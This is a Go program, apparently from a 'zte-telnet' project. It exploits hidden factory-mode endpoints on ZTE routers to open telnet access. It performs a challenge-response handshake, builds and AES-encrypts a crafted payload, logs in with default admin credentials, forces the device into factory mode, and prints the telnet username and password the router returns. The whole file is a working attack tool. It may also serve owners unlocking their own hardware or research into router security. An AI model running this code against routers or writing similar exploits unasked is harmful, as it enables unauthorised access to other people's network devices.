package main

import (
	"bytes"
	"encoding/hex"
	"errors"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"zte-telnet/internal/pwn"
)

type Options struct {
	Addr     string
	Username string
	Password string
	MAC      string
}

var opt Options

func post(path string, data []byte) ([]byte, error) {
	c := http.DefaultClient
	log.Println("POST >>", path)
	r, err := c.Post(opt.Addr+path, "text/plain", bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	var body []byte
	if r.Body != nil {
		body, err = io.ReadAll(r.Body)
	}
	if err == io.EOF {
		err = nil
	}
	if len(body) > 0 {
		log.Println("<<", string(body))
	}
	if r.StatusCode != 200 {
		return nil, errors.New(fmt.Sprintf("http code err %d", r.StatusCode))
	}
	return body, err
}

// PKCS7填充
func pkcs7Pad(data []byte, blockSize int) []byte {
	padding := blockSize - len(data)%blockSize
	if padding > 0 {
		for i := 0; i < padding; i++ {
			data = append(data, 0)
		}
	}
	return data
}

func openTelnet(pcMac []byte) error {
	_, _ = post("/webFac", []byte("SendSq.gch"))
	_, _ = post("/webFac", []byte("RequestFactoryMode.gch"))
	body, err := post("/webFac", []byte("SendSq.gch?rand=0\r\n"))
	if err != nil {
		return err
	}
	str := string(body)
	if !strings.HasPrefix(str, "re_rand=") {
		return errors.New("rsp body err")
	}

	items := strings.Split(str[len("re_rand="):], "&")

	if len(items) < 3 {
		return errors.New("body content err")
	}
	re_rand, err := strconv.Atoi(items[0])
	if err != nil {
		return errors.New("re_rand err")
	}
	seed, err := strconv.Atoi(items[1])
	if err != nil {
		return errors.New("seed err")
	}
	_ = seed
	mac := str[len(str)-6:]

	clientRand := 0

	client_rand_mix := 0x1000193 * clientRand
	client_rand_mask := client_rand_mix & 0x8000003F

	client_xor_server := client_rand_mask ^ re_rand
	client_xor_server_mod := client_xor_server % 60
	log.Println("server mac", hex.EncodeToString([]byte(mac)))

	aes := pwn.GenerateAesKey(client_xor_server_mod)

	payload_arr := pwn.CreatePayloadArray([]byte(mac), pcMac, int(client_xor_server_mod))
	if !pwn.VerifyDoCheckClient(payload_arr, pcMac, int(client_xor_server_mod), []byte(mac)) {
		return errors.New("verify err")
	}

	value := pwn.BuildPayloadString(payload_arr)
	payloadBytes := pkcs7Pad([]byte(value), aes.BlockSize())

	dist, err := pwn.EncryptAES(aes, payloadBytes)
	if err != nil {
		return err
	}

	_ = dist
	_, err = post("/webFacEntry", dist)
	if err != nil {
		return err
	}
	py := []byte(fmt.Sprintf("CheckLoginAuth.gch?version50&user=%s&pass=%s", opt.Username, opt.Password))
	py, _ = pwn.EncryptAES(aes, py)
	body, err = post("/webFacEntry", py)
	if err != nil {
		return err
	}
	body, err = pwn.DecryptAES(aes, body)
	if err != nil {
		return err
	}
	if string(body) != "FactoryMode.gch" {
		return errors.New("expected result to match 'FactoryMode.gch")
	}
	py = []byte("FactoryMode.gch?mode=2&user=notused")
	py, _ = pwn.EncryptAES(aes, py)
	body, err = post("/webFacEntry", py)

	if err != nil {
		return err
	}
	body, err = pwn.DecryptAES(aes, body)
	str = string(body)
	log.Println("body", str)

	idx := strings.IndexByte(str, '?')
	if idx > 0 {
		q, err := url.ParseQuery(str[idx+1:])
		if err != nil {
			return err
		}
		usr := q.Get("user")
		pwd := q.Get("pass")

		log.Println("Telnet", usr, pwd)
	}
	return err
}
func parseMac(s string) ([]byte, error) {
	if s == "" {
		return nil, errors.New("empty mac")
	}
	return pwn.ParseMac(s)
}
func main() {
	flag.StringVar(&opt.Addr, "addr", "http://192.168.1.1", "ZTE router address")
	flag.StringVar(&opt.Username, "username", "CUAdmin", "ZTE router username")
	flag.StringVar(&opt.Password, "password", "CUAdmin", "ZTE router password")
	flag.StringVar(&opt.MAC, "mac", "", "your pc mac address")
	flag.Parse()
	pcMac, err := parseMac(opt.MAC)
	if err != nil {
		flag.Usage()
		log.Fatal(err)
	}

	err = openTelnet(pcMac)
	if err != nil {
		log.Fatal(err)
	}

}
